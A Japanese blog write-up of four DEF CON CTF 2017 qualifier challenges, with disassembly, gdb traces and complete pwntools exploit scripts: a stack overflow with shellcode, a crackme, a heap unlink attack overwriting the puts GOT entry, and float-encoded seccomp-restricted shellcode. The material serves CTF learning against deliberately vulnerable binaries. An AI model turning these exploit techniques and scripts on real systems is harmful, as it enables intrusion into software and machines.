---
title: DEF CON CTF 2017 Qualifier writeup
date: 2017-05-02 01:32:00+0900
tags: CTF
---

[DEF CON CTF 2017 Qualifier](https://ctftime.org/event/459) に一人チーム [poepoe](https://ctftime.org/team/32588) で参加. 144 points で 117 位.

Baby's First の問題しか解けなかったけど, pwn するの久しぶりだったので楽しかった.  
それ以外の問題も点を入れていけるようにしていくぞ💪.

READMORE

## smashme

x86-64 の ELF.

    $ file smashme
    smashme: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=29c2093a0eca94730cd7fd861519602b3272a4f7, not stripped, with debug_info

    $ checksec --file smashme
    [*] '/tmp/smashme'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x400000)

radare2 でディスアセンブルするとこんな感じ.  
超キケンな `gets` で stack に文字列を読み込んでいるため stack buffer overflow が起こせるのがわかる. ただし, その後に呼ばれる `sub.ifunc_4253b0_320` が非ゼロの値を返さないと `exit` が呼ばれてしまうので, 任意のアドレスに飛ばすには入力する文字列に細工が必要なようだ.

    |           0x004009d6      488d45c0       lea rax, qword [rbp - local_40h]
    |           0x004009da      4889c7         mov rdi, rax
    |           0x004009dd      b800000000     mov eax, 0
    |           0x004009e2      e8e9f00000     call sym.gets              ; char*gets(char *s)
    |           0x004009e7      488d45c0       lea rax, qword [rbp - local_40h]
    |           0x004009eb      bed8064a00     mov esi, str.Smash_me_outside__how_bout_dAAAAAAAAAAA ; "Smash me outside, how bout dAAAAAAAAAAA" @ 0x4a06d8
    |           0x004009f0      4889c7         mov rdi, rax
    |           0x004009f3      e828f9ffff     call sub.ifunc_4253b0_320
    |           0x004009f8      4885c0         test rax, rax
    |       ,=< 0x004009fb      7407           je 0x400a04
    |       |   0x004009fd      b800000000     mov eax, 0
    |      ,==< 0x00400a02      eb0a           jmp 0x400a0e
    |      ||      ; JMP XREF from 0x004009fb (sym.main)
    |      |`-> 0x00400a04      bf00000000     mov edi, 0
    |      |    0x00400a09      e822e00000     call sym.exit              ; void exit(int status)
    |      |       ; JMP XREF from 0x00400a02 (sym.main)
    |      `--> 0x00400a0e      c9             leave
    \           0x00400a0f      c3             ret

  この `sub.ifunc_4253b0_320` がよくわからない[^1]ので gdb で処理を追ってみたところ, [`strstr`](http://en.cppreference.com/w/c/string/byte/strstr) に飛ぶことがわかった. `strstr` は第1引数に渡した文字列に第2引数引数に渡した文字列が含まれていたらその先頭文字のアドレスを, そうでなければ `NULL` を返す関数らしい. ということは, `call` される直前で `rsi` (第2引数) に設定されている `"Smash me outside, how bout dAAAAAAAAAAA"` で始まる文字列を入力すればよさそう.

[^1]: これの一種かな? [Function Attributes - Using the GNU Compiler Collection (GCC)](https://gcc.gnu.org/onlinedocs/gcc-5.4.0/gcc/Function-Attributes.html)

gdb-peda の `pattc`, `patto` コマンドを使って調べると, 入力した文字列とリターンアドレスとののオフセットは↑の文字列+33文字なのがわかった.

    gdb-peda$ c
    Continuing.
    Welcome to the Dr. Phil Show. Wanna smash?
    Smash me outside, how bout dAAAAAAAAAAAAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

    ...

    Stopped reason: SIGSEGV
    0x0000000000400a0f in main ()
    gdb-peda$ x/gx $rsp
    0x7fffffffdf48:	0x4161414145414129
    gdb-peda$ patto 0x4161414145414129
    4711118433796833577 found at offset: 33

そこで, その文字列のうしろに `0x0044611d: push rsp ; ret  ;  (2 found)` と shellcode をくっつけてみたところシェルを取ることができた. 作成したスクリプトと実行結果は次の通り.

```python
#!/usr/bin/env python2

# DEF CON 2017 Quals : smashme

from pwn import *
import sys

addr_push_rsp_ret = 0x0044611d # 0x0044611d: push rsp ; ret  ;  (2 found)

context(os='linux', arch='amd64')

if 'remote' in sys.argv:
    r = remote('smashme_omgbabysfirst.quals.shallweplayaga.me', 57348)
else:
    r = process('./smashme')

r.recvuntil('Welcome to the Dr. Phil Show. Wanna smash?\n')
buf = ''
buf += 'Smash me outside, how bout dAAAAAAAAAAA'
buf += 'A' * 33
buf += p64(addr_push_rsp_ret)
buf += asm(shellcraft.sh())
r.sendline(buf)

r.interactive()
```

    $ ./exploit.py remote
    [+] Opening connection to smashme_omgbabysfirst.quals.shallweplayaga.me on port 57348: Done
    [*] Switching to interactive mode
    $ ls
    flag
    smashme
    $ cat flag
    The flag is: You must be at least this tall to play DEF CON CTF 5b43e02608d66dca6144aaec956ec68d
    $ 
    [*] Closed connection to smashme_omgbabysfirst.quals.shallweplayaga.me port 57348

## crackme1

x86-64 の ELF.  
Alpine Linux で作られたようで, 実行には musl libc が必要.

    $ file 4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652
    4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, stripped, with debug_info

    $ docker run -t -v "$PWD":/work -w /work -i alpine /bin/sh        
    /work # ./4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652 
    enter code:
    nyan
    /work # 

`"enter code:"`と表示した後に入力を受け付けているようだが, 適当に入力しただけでは `exit` されてしまう.  
それっぽい箇所をディスアセンブルするとこんな感じ. `"sum is %ld."` という表示がされていないことから `exit` を呼んでいるのは `fcn.00000c6c` の中だと推測できる.


    |           0x0000079b      488b15861820.  mov rdx, qword [obj.stdin]  ; [0x202028:8]=0x7368732e00003232 ; LEA obj.stdin ; "22" @ 0x202028
    |           0x000007a2      be50000000     mov esi, 0x50               ; 'P'
    |           0x000007a7      4889df         mov rdi, rbx
    |           0x000007aa      e879ffffff     call sym.imp.fgets         ; char *fgets(char *s, int size, FILE *stream)
    |           0x000007af      4889df         mov rdi, rbx
    |           0x000007b2      e8b5040000     call fcn.00000c6c
    |           0x000007b7      488d3d170700.  lea rdi, qword str.sum_is__ld_n ; 0xed5 ; str.sum_is__ld_n ; "sum is %ld." @ 0xed5
    |           0x000007be      4889c6         mov rsi, rax
    |           0x000007c1      31c0           xor eax, eax
    |           0x000007c3      e858ffffff     call sym.imp.printf 

`fcn.00000c6c` を詳しく調べていく. この関数は第1引数 `rdi` に与えられた文字列を1文字ずつ別の関数に渡し, その返り値を `rbx` に足したりしているようだ.

    |           0x00000c6c      55             push rbp
    |           0x00000c6d      53             push rbx
    |           0x00000c6e      4889fd         mov rbp, rdi
    |           0x00000c71      4883ec08       sub rsp, 8
    |           0x00000c75      480fbe3f       movsx rdi, byte [rdi]
    |           0x00000c79      e8bdfcffff     call fcn.0000093b
    |           0x00000c7e      480fbe7d01     movsx rdi, byte [rbp + arg_1h] ; [0x1:1]=69
    |           0x00000c83      48c1f803       sar rax, 3
    |           0x00000c87      4889c3         mov rbx, rax
    |           0x00000c8a      e8c6fcffff     call fcn.00000955
    |           0x00000c8f      480fbe7d02     movsx rdi, byte [rbp + arg_2h] ; [0x2:1]=76
    |           0x00000c94      4801c3         add rbx, rax                ; '#'
    |           0x00000c97      48c1fb03       sar rbx, 3
    |           0x00000c9b      e8d1fcffff     call fcn.00000971

この別の関数というのはどれもこんな感じで, 引数が比較している値と違ったら `exit` を呼ぶというものであった. ということは, この比較している文字を見ていけば良さそう. (めんどくせえ...)

    |           0x0000093b      4883ff79       cmp rdi, 0x79               ; 'y' ; 'y'
    |       ,=< 0x0000093f      740e           je 0x94f
    |       |   0x00000941      4883ec08       sub rsp, 8
    |       |   0x00000945      bf01000000     mov edi, 1
    |       |   0x0000094a      e809feffff     call sym.imp.exit          ; void exit(int status)
    |       |      ; JMP XREF from 0x0000093f (fcn.0000093b)
    |       `-> 0x0000094f      b8a7000000     mov eax, 0xa7               ; section_end..shstrtab
    \           0x00000954      c3             ret

で, その結果 `"yes and his hands shook with ex"` という文字列が出てきた. でもこれは Flag ではないみたい.

問題文をよく見ると, 怪しい url が書かれていた. アクセスしてみると, 解答を base64 で送れと言われる. 実際にやってみると Flag が出てきた.

    $ echo yes and his hands shook with ex | base64
    eWVzIGFuZCBoaXMgaGFuZHMgc2hvb2sgd2l0aCBleAo=

    $ nc crackme1_f92e0ab22352440383d58be8f046bebe.quals.shallweplayaga.me 10001
    send your solution as base64, followed by a newline
    4a2181aaf70b04ec984c233fbe50a1fe600f90062a58d6b69ea15b85531b9652
    eWVzIGFuZCBoaXMgaGFuZHMgc2hvb2sgd2l0aCBleAo=
    The flag is: important videos best playlist Wigeekuk8
    ^C

## beatmeonthedl

x86-64 の ELF.

    $ file beatmeonthedl
    beatmeonthedl: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, not stripped, with debug_info

    $ checksec --file beatmeonthedl
    [*] '/tmp/beatmeonthedl'
        Arch:     amd64-64-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x400000)

実行してみると, まずユーザ名とパスワードを聞いてくる. これは gdb で適当な文字を入力したときの処理を追っていけば出てくる.

    $ ./beatmeonthedl
         __      __       .__                                  __           
        /  \    /  \ ____ |  |   ____  ____   _____   ____   _/  |_  ____   
        \   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \  \   __\/  _ \  
         \        /\  ___/|  |_\  \__(  <_> )  Y Y  \  ___/   |  | (  <_> ) 
          \__/\  /  \___  >____/\___  >____/|__|_|  /\___  >  |__|  \____/  
               \/       \/          \/            \/     \/                 
        __  .__             .__         .__                 _____    __  .__            
      _/  |_|  |__   ____   |  | _____  |__|______    _____/ ____\ _/  |_|  |__   ____  
      \   __\  |  \_/ __ \  |  | \__  \ |  \_  __ \  /  _ \   __\  \   __\  |  \_/ __ \ 
       |  | |   Y  \  ___/  |  |__/ __ \|  ||  | \/ (  <_> )  |     |  | |   Y  \  ___/ 
       |__| |___|  /\___  > |____(____  /__||__|     \____/|__|     |__| |___|  /\___  >
                 \/     \/            \/                                      \/     \/ 
      _________.__                .___              __________                __
     /   _____/|  |__ _____     __| _/______  _  __ \______   \_______  ____ |  | __ ___________  ______
     \_____  \ |  |  \\__  \   / __ |/  _ \ \/ \/ /  |    |  _/\_  __ \/  _ \|  |/ \// __ \_  __ \/  ___/
     /        \|   Y  \/ __ \_/ /_/ (  <_> )     /   |    |   \ |  | \(  <_> )    <\  ___/|  |  \/\___ \ 
    /_______  /|___|  (____  /\____ |\____/ \/\_/    |______  / |__|   \____/|__|_ \\___  >__|    /____ >
            \/      \/     \/      \/                       \/                    \/    \/             \/ 
    Enter username: mcfly
    Enter Pass: awesnap
    I) Request Exploit.
    II) Print Requests.
    III) Delete Request.
    IV) Change Request.
    V) Go Away.
    | 

それ以降の処理を調べていく.

このプログラムは,  `malloc(0x38)` した領域の確保/編集/開放, および確保した領域のリストアップができるというものだった. 気になる脆弱性は次の2つ.

1. `malloc` は独自に組み込まれたもの (glibc じゃない) で, さらに確保した領域は実行可能になっている
2. "Request Exploit." や "Change Request." の確保した領域へ書き込む処理で0x80文字も読み込んでいて heap buffer overflow が起こせる

何となく, この手の問題によくある unlink attack して GOT overwrite するやつかなーと推測できる.

    |      |`-> 0x00401035      bf38000000     mov edi, 0x38               ; '8'
    |      |    0x0040103a      e89d4a0000     call sym.malloc            ;  void *malloc(size_t size)
    |      |    0x0040103f      4889c2         mov rdx, rax
    |      |    0x00401042      8b45fc         mov eax, dword [rbp - local_4h]
    |      |    0x00401045      4898           cdqe
    |      |    0x00401047      488914c5809e.  mov qword [rax*8 + obj.reqlist], rdx ; [0x609e80:8]=0x4013b2 sym.init_mparams ; LEA obj.reqlist ; obj.reqlist

    ...

    |      |    0x0040108e      488b04c5809e.  mov rax, qword [rax*8 + obj.reqlist] ; [0x609e80:8]=0x4013b2 sym.init_mparams ; LEA obj.reqlist ; obj.reqlist
    |      |    0x00401096      ba80000000     mov edx, 0x80
    |      |    0x0040109b      4889c6         mov rsi, rax
    |      |    0x0040109e      bf00000000     mov edi, 0
    |      |    0x004010a3      b800000000     mov eax, 0
    |      |    0x004010a8      e873faffff     call sym.imp.read          ; ssize_t read(int fildes, void *buf, size_t nbyte)

ということで, `malloc`, `free` の挙動を確認しながら次のような攻撃を行なった.

まず5つの領域 (buffer0 ~ buffer4 と呼ぶことにする) を確保し, buffer3, buffer1 の順で開放する. すると, heap は次のようになっていた. chunk の構造は glibc のものとだいたい同じで, `prev_size`, `size`, `fd`, `bk` に相当するメンバを持っていた. また, 開放した領域は 0x609b88 にある管理領域?が持つ chunk を先頭とする双方向循環リストになっていた.

ちなみに, chunk の番号と buffer の番号がずれているが, これは chunk0 が入力したパスワードを格納するために使われているためである.

    gdb-peda$ x/50gx 0x00db4000
    0xdb4000:	0x0000000000000000	0x0000000000000023 <- chunk0
    0xdb4010:	0x0a70616e73657761	0x0000000000000000
    0xdb4020:	0x0000000000000000	0x0000000000000043 <- chunk1
    0xdb4030:	0x0030726566667562	0x0000000000000000 <- buffer0
    0xdb4040:	0x0000000000000000	0x0000000000000000
    0xdb4050:	0x0000000000000000	0x0000000000000000
    0xdb4060:	0x0000000000000000	0x0000000000000041 <- chunk2
    0xdb4070:	0x0000000000db40e0	0x0000000000609b88
    0xdb4080:	0x0000000000000000	0x0000000000000000
    0xdb4090:	0x0000000000000000	0x0000000000000000
    0xdb40a0:	0x0000000000000040	0x0000000000000042 <- chunk3
    0xdb40b0:	0x0032726566667562	0x0000000000000000 <- buffer2
    0xdb40c0:	0x0000000000000000	0x0000000000000000
    0xdb40d0:	0x0000000000000000	0x0000000000000000
    0xdb40e0:	0x0000000000000000	0x0000000000000041 <- chunk4
    0xdb40f0:	0x0000000000609b88	0x0000000000db4060
    0xdb4100:	0x0000000000000000	0x0000000000000000
    0xdb4110:	0x0000000000000000	0x0000000000000000
    0xdb4120:	0x0000000000000040	0x0000000000000042 <- chunk5
    0xdb4130:	0x0034726566667562	0x0000000000000000 <- buffer4
    0xdb4140:	0x0000000000000000	0x0000000000000000
    0xdb4150:	0x0000000000000000	0x0000000000000000
    0xdb4160:	0x0000000000000000	0x0000000000000e51
    0xdb4170:	0x0000000000000000	0x0000000000000000
    0xdb4180:	0x0000000000000000	0x0000000000000000
    gdb-peda$ x/8gx 0x0000000000609b88
    0x609b88 <_gm_+200>:	0x0000000000609b78	0x0000000000609b78 <- top
    0x609b98 <_gm_+216>:	0x0000000000db4060	0x0000000000db40e0
    0x609ba8 <_gm_+232>:	0x0000000000609b98	0x0000000000609b98
    0x609bb8 <_gm_+248>:	0x0000000000609ba8	0x0000000000609ba8

次に buffer2 を通して chunk4 の `fd` を `puts` の GOT から 0x18 を引いた値に書き換えて,

    gdb-peda$ x/50gx 0x00db4000
    0xdb4000:	0x0000000000000000	0x0000000000000023
    0xdb4010:	0x0a70616e73657761	0x0000000000000000
    0xdb4020:	0x0000000000000000	0x0000000000000043 <- chunk1
    0xdb4030:	0x0030726566667562	0x0000000000000000 <- buffer0
    0xdb4040:	0x0000000000000000	0x0000000000000000
    0xdb4050:	0x0000000000000000	0x0000000000000000
    0xdb4060:	0x0000000000000000	0x0000000000000041 <- chunk2
    0xdb4070:	0x0000000000db40e0	0x0000000000609b88
    0xdb4080:	0x0000000000000000	0x0000000000000000
    0xdb4090:	0x0000000000000000	0x0000000000000000
    0xdb40a0:	0x0000000000000040	0x0000000000000042 <- chunk3
    0xdb40b0:	0x4141414141414141	0x4141414141414141 <- buffer2
    0xdb40c0:	0x4141414141414141	0x4141414141414141
    0xdb40d0:	0x4141414141414141	0x4141414141414141
    0xdb40e0:	0x4141414141414141	0x0000000000000041 <- chunk4
    0xdb40f0:	0x0000000000609940	0x0000000000db4060
    0xdb4100:	0x0000000000000000	0x0000000000000000
    0xdb4110:	0x0000000000000000	0x0000000000000000
    0xdb4120:	0x0000000000000040	0x0000000000000042 <- chunk5
    0xdb4130:	0x0034726566667562	0x0000000000000000 <- buffer4
    0xdb4140:	0x0000000000000000	0x0000000000000000
    0xdb4150:	0x0000000000000000	0x0000000000000000
    0xdb4160:	0x0000000000000000	0x0000000000000e51
    0xdb4170:	0x0000000000000000	0x0000000000000000
    0xdb4180:	0x0000000000000000	0x0000000000000000
    gdb-peda$ x/8gx 0x0000000000609940
    0x609940:	0x00007f6fb21795f0	0x0000000000400ab6
    0x609950:	0x0000000000400ac6	0x00007f6fb1e2a110 <- puts_got
    0x609960:	0x00007f6fb1e41d10	0x0000000000400af6
    0x609970:	0x00007f6fb1e10e00	0x00007f6fb1e459c0

その後 buffer4 の開放を行ったところ, chunk4 と chunk5 の結合処理 (unlink) が走り, `puts` の GOT を chunk2 のアドレスに書き換えることができた.

    gdb-peda$ x/50gx 0x00db4000
    0xdb4000:	0x0000000000000000	0x0000000000000023
    0xdb4010:	0x0a70616e73657761	0x0000000000000000
    0xdb4020:	0x0000000000000000	0x0000000000000043 <- chunk1
    0xdb4030:	0x0030726566667562	0x0000000000000000 <- buffer0
    0xdb4040:	0x0000000000000000	0x0000000000000000
    0xdb4050:	0x0000000000000000	0x0000000000000000
    0xdb4060:	0x0000000000000000	0x0000000000000041 <- chunk2
    0xdb4070:	0x0000000000609940	0x0000000000609b88
    0xdb4080:	0x0000000000000000	0x0000000000000000
    0xdb4090:	0x0000000000000000	0x0000000000000000
    0xdb40a0:	0x0000000000000040	0x0000000000000042 <- chunk3
    0xdb40b0:	0x4141414141414141	0x4141414141414141 <- buffer2
    0xdb40c0:	0x4141414141414141	0x4141414141414141
    0xdb40d0:	0x4141414141414141	0x4141414141414141
    0xdb40e0:	0x4141414141414141	0x0000000000000ed1 <- chunk4
    0xdb40f0:	0x0000000000609940	0x0000000000db4060
    0xdb4100:	0x0000000000000000	0x0000000000000000
    0xdb4110:	0x0000000000000000	0x0000000000000000
    0xdb4120:	0x0000000000000040	0x0000000000000042 <- chunk5 (unlinked)
    0xdb4130:	0x0034726566667562	0x0000000000000000
    0xdb4140:	0x0000000000000000	0x0000000000000000
    0xdb4150:	0x0000000000000000	0x0000000000000000
    0xdb4160:	0x0000000000000000	0x0000000000000e51
    0xdb4170:	0x0000000000000000	0x0000000000000000
    0xdb4180:	0x0000000000000000	0x0000000000000000
    gdb-peda$ x/8gx 0x0000000000609940
    0x609940:	0x00007f6fb21795f0	0x0000000000400ab6
    0x609950:	0x0000000000400ac6	0x0000000000db4060 <- puts_got
    0x609960:	0x00007f6fb1e41d10	0x0000000000400af6
    0x609970:	0x00007f6fb1e10e00	0x00007f6fb1e459c0

このあとすぐにメニューを表示処理で `puts` が呼ばれるので, の開放を行う前に buffer0 を通して shellcode 書き込んでおけばよさそう. ただし, unlink attack 後は chunk2 の `fd` や `bk` が書き換わってしまうので, メインの shellcode は buffer0 に書き込み, chunk2 の先頭 (glibc malloc でいう `prev_size` に相当する部分) に `jmp -0x30` を置いて shellcode の先頭に飛ぶようにした.

実際に作成したスクリプトと実行結果は次の通り.  
攻撃では使わなかったが, 確保したバッファをリストアップする際に `printf` の `%s` を使っているのを利用して chunk4 の `bk` のリークなども行なっている.

```python
#!/usr/bin/env python2

# DEF CON 2017 Quals : beatmeonthedl

from pwn import *
import sys

username = 'mcfly'
password = 'awesnap'

buffer_size = 0x38

# [0x0040123c]> f~reloc.puts
# 0x00609958 8 reloc.puts_88
addr_puts_got = 0x00609958

context(os='linux', arch='amd64')

if 'remote' in sys.argv:
    r = remote('beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me', 6969)
else:
    r = process('./beatmeonthedl')

# login
r.recvuntil('Enter username: ')
r.sendline(username)
r.recvuntil('Enter Pass: ')
r.sendline(password)
r.recvuntil('I) Request Exploit.')
log.success('login successful!')

def choose_action(n):
    r.recvuntil(') Go Away.\n| ')
    r.sendline(str(n))

def add_request(text):
    choose_action(1)
    r.recvuntil('Request text > ')
    r.send(text)

def delete_request(n):
    choose_action(3)
    r.recvuntil('choice: ')
    r.sendline(str(n))

def update_request(n, text):
    choose_action(4)
    r.recvuntil('choice: ')
    r.sendline(str(n))
    r.recvuntil('data: ')
    r.send(text)

def go_away():
    choose_action(5)

log.info('alloc 0x38 bytes buffer x5')
for i in range(0, 5):
    add_request('buffer{}'.format(i))

log.info('free buffer3 and buffer1')
for i in [3, 1]:
    delete_request(i)

log.info('overwrite chunk4 via buffer2')
buf = ''
buf += 'A' * buffer_size    # buffer2
buf += 'A' * 8              # chunk4's size
buf += 'A' * 8              # chunk4's fd
update_request(2, buf)

log.info('leak chunk4\'s bk')
choose_action(2)
r.recvuntil(buf)
leak = r.recvuntil('\n')[:-1]
addr_chunk2    = u64(leak + '\x00' * (8 - len(leak)))
addr_heap_base = addr_chunk2 - 0x60
log.success('addr_chunk2:    0x{:x}'.format(addr_chunk2))
log.success('addr_heap_base: 0x{:x}'.format(addr_heap_base))

log.info('write shellcode to buffer0')
buf = ''
buf += asm(shellcraft.sh())
buf += '\x90' * (buffer_size - 8 - len(buf))    # buffer0
buf += '\xeb\xce'       # $ rasm2 -a x86 -b 64 'jmp -0x30'
buf += '\x90' * (0x80 - len(buf))
update_request(0, buf)

log.info('overwrite chunk4 via buffer2')
buf = ''
buf += 'A' * buffer_size
buf += p64(0x41)                    # size
buf += p64(addr_puts_got - 0x18)    # fd
update_request(2, buf)

log.info('free buffer4')
delete_request(4)

log.info('trigger shellcode')

r.interactive()
```

    $ ./exploit.py remote
    [+] Opening connection to beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me on port 6969: Done
    [+] login successful!
    [*] alloc 0x38 bytes buffer x5
    [*] free buffer3 and buffer1
    [*] overwrite chunk4 via buffer2
    [*] leak chunk4's bk
    [+] addr_chunk2:    0x17e6060
    [+] addr_heap_base: 0x17e6000
    [*] write shellcode to buffer0
    [*] overwrite chunk4 via buffer2
    [*] free buffer4
    [*] trigger shellcode
    [*] Switching to interactive mode
    $ ls
    beatmeonthedl
    flag
    $ cat flag
    The flag is: 3asy p33zy h3ap hacking!!
    $ 
    [*] Closed connection to beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me port 6969

## floater

x86-64 の ELF.

    $ file floater
    floater: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=303c68e5ee9256abcf9e3d1297eaf1e48e2e72fe, stripped, with debug_info

    $ checksec --file floater 
    [*] '/tmp/floater'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      PIE enabled

プログラムの主な処理を調べていくと次のような感じだった. いわゆるシステムコールが制限された環境での shellcode 問題なのがわかるが, shellcode を流し込む方法がちょっと特殊.

1. `mmap` で読み書き可な領域を確保
2. 25回入力を読み込み, それぞれある処理 (後述) をしてから確保した領域に書き込む
3. 確保した領域を `mprotect` で書き込み不可/実行可にする
4. seccomp で `open`, `read`, `write`, `close`, `exit` 以外の システムコールを無効にする
5. 確保した領域を `call` する

その25回入力を読み込んでいる部分がこんな感じ.  
`read` で読み込んだ文字列を `strtof` で `float` に変換し, その値を `sub.pow_6f0` で処理した結果 (`xmm0`, 4つの `float` か 2つの `double` が入る 128bits の SSE レジスタ) を確保した領域に `movss` (**mov**e **s**calar **s**ingle-precision floating-point value) で書き込んでいるのがわかる.

    |       .-> 0x000014f8      83bd6cffffff.  cmp dword [rbp - counter], 0x32 ; [0x32:4]=0x400000 ; '2'
    |      ,==< 0x000014ff      0f8d57000000   jge 0x155c
    |      ||   0x00001505      31ff           xor edi, edi
    |      ||   0x00001507      ba64000000     mov edx, 0x64               ; 'd'
    |      ||   0x0000150c      488db570ffff.  lea rsi, qword [rbp - local_90h]
    |      ||   0x00001513      e8d8080000     call sub.read_df0          ; ssize_t read(int fildes, void *buf, size_t nbyte)
    |      ||   0x00001518      31d2           xor edx, edx
    |      ||   0x0000151a      89d6           mov esi, edx
    |      ||   0x0000151c      488dbd70ffff.  lea rdi, qword [rbp - local_90h]
    |      ||   0x00001523      898534ffffff   mov dword [rbp - local_cch], eax
    |      ||   0x00001529      e8c2fbffff     call sym.imp.strtof         ; xmm0 <- result; float strtof(const char *str, char**endptr)
    |      ||   0x0000152e      bf03000000     mov edi, 3
    |      ||   0x00001533      e8b8010000     call sub.pow_6f0
    |      ||   0x00001538      4863b56cffff.  movsxd rsi, dword [rbp - counter]
    |      ||   0x0000153f      488b4de0       mov rcx, qword [rbp - mmaped_buf]
    |      ||   0x00001543      f30f1104b1     movss dword [rcx + rsi*4], xmm0
    |      ||   0x00001548      8b856cffffff   mov eax, dword [rbp - counter]
    |      ||   0x0000154e      83c002         add eax, 2
    |      ||   0x00001551      89856cffffff   mov dword [rbp - counter], eax
    |      |`=< 0x00001557      e99cffffff     jmp 0x14f8
    |      |       ; JMP XREF from 0x000014ff (main)
    |      `--> 0x0000155c      b8c8000000     mov eax, 0xc8

そして`sub.pow_6f0` の処理は, 入力した値 \* 1000 + 0.5 を [`floor`](http://en.cppreference.com/w/c/numeric/math/floor) してから 1000 で割った値を `float` で返すというものだった.

まとめると,

1. **shellcode は↑の処理を通しても変化しない25個の `float` 値で送る必要がある**
  - 小数点以下の数を持っていなければいい?
2. **shellcode の 4bytes 毎に 0x00000000 が入ることを考慮する必要がある**
  - 送られた `float` 値 (32bits) は 64bits の領域に順に書き込まれるため

いろいろ試したところ, shellcode を 3bytesの命令 + 0x68 (`push imm32`) で構成することで上手く行った.  
例えば `mov rdi, rax` は 0x48 0x89 0xc7, `push 0` は 0x68 0x00 0x00 0x00 0x00 となり, little-endian に直したときの下位 32bits の値 0x68c78948 を `float` として解釈してみると 7.538266577407427e+24 になるという感じである.

    $ python
    Python 2.7.13 (default, Feb 11 2017, 12:22:40) 
    [GCC 6.3.1 20170109] on linux2
    Type "help", "copyright", "credits" or "license" for more information.
    >>> import struct
    >>> struct.unpack('!f', '\x68\xc7\x89\x48')[0]
    7.538266577407427e+24

実際に作成したスクリプトと実行結果は次の通り.  
使えるシステムコールが限定されているので, Flag を `open` -> `read` -> `write` する shellcode を書いた. この縛りでファイル名 `"flag"` を生成することは厳しかったので, 最初に `read` してこちらから送り込むことで対処した. また, `mov rdi, 数値` のような命令は 3bytes に収まらないので, `xor rax, rax ; lea rdi, [rax+数値]` のような命令で何とかした.

```python
#!/usr/bin/env python2

# DEF CON 2017 Quals : floater

from pwn import *
import struct
import sys

context(os='linux', arch='amd64')

if 'remote' in sys.argv:
    r = remote('floater_f128edcd6c7ecd2ceac15235749c1565.quals.shallweplayaga.me', 754)
else:
    r = process('./floater-patched')

shellcode = [
    # read(0, stack, 0x80)
    '\x48\x89\xe6',   # mov rsi, rsp
    '\x48\x31\xc0',   # xor rax, rax
    '\x48\x89\xc7',   # mov rdi, rax
    '\x8d\x50\x10',   # lea rdx, [rax+10]
    '\x48\x01\xd2',   # add rdx, rdx (rdx=0x20)
    '\x48\x01\xd2',   # add rdx, rdx (rdx=0x40)
    '\x48\x01\xd2',   # add rdx, rdx (rdx=0x80)
    '\x0f\x05\x90',   # syscall ; nop
    # save big number
    '\x49\x89\xd0',   # mov r8, rdx
    # open(stack, 0, 0)
    '\x48\x89\xf7',   # mov rdi, rsi
    '\x48\x31\xf6',   # xor rsi, rsi
    '\x48\x31\xd2',   # xor rdx, rdx
    '\x8d\x42\x02',   # lea rax, [rdx+2]
    '\x0f\x05\x90',   # syscall ; nop
    # read(fd, stack, 0x80)
    '\x48\x89\xc7',   # mov rdi, rax
    '\x48\x89\xe6',   # mov rsi, rsp
    '\x4c\x89\xc2',   # mov rdx, r8
    '\x48\x31\xc0',   # xor rax, rax
    '\x0f\x05\x90',   # syscall ; nop
    # write(1, rsp, 0x80)
    '\x4c\x89\xc2',   # mov rdx, r8
    '\x48\x31\xc0',   # xor rax, rax
    '\x48\xff\xc0',   # inc rax
    '\x48\x89\xc7',   # mov rdi, rax
    '\x0f\x05\x90',   # syscall ; nop
]

log.info('send shellcode')

for s in shellcode:
    f = struct.unpack('!f', (s + '\x68')[::-1])[0]
    s = '%.64lg' % f
    print s
    r.sendline(s)

for i in range(0, 25 - len(shellcode)):
    r.sendline('0')

pause(1)

r.clean()

r.sendline('flag'.ljust(0x7f, '\x00'))

r.interactive()
```

    $ ./exploit.py remote
    [+] Opening connection to floater_f128edcd6c7ecd2ceac15235749c1565.quals.shallweplayaga.me on port 754: Done
    [*] send shellcode
    8709413465159098708262912
    7260827546538835038961664
    7538266577407426695266304
    2726026692719540090961920
    7933764770347759481913344
    7933764770347759481913344
    7933764770347759481913344
    5440912704940064219594752
    7878277540634793454075904
    9351655306829370457325568
    9300889867138521771278336
    7940848320072063949733888
    2460541152010712224104448
    5440912704940064219594752
    7538266577407426695266304
    8709413465159098708262912
    7349374223935650100412416
    7260827546538835038961664
    5440912704940064219594752
    7349374223935650100412416
    7260827546538835038961664
    7291227780772308380024832
    7538266577407426695266304
    5440912704940064219594752
    [+] Waiting: Done
    [*] Switching to interactive mode
    The flag is: l00ks_l1k3_w3_g0t_0ur53lv35_4_fl04t3r
    \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00flag\x00\x00\x00\x00[*] Got EOF while reading in interactive
    $ 
    [*] Closed connection to floater_f128edcd6c7ecd2ceac15235749c1565.quals.shallweplayaga.me port 754

